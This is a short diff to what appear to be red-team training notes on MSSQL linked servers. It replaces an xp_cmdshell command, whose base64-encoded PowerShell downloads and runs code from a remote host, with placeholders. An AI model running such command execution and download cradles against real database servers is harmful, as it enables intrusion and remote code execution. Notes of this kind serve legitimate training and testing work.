@@ -80,4 +80,4 @@ Get User information:
   
 ## MSSQL
   
-> SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select @@servername; exec xp_cmdshell ''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAtADMANwAyADEAJwApACkA''');
+> SELECT * FROM OPENQUERY("[targetserver]", 'select @@servername; exec xp_cmdshell ''powershell -enc [EncodedString]''');
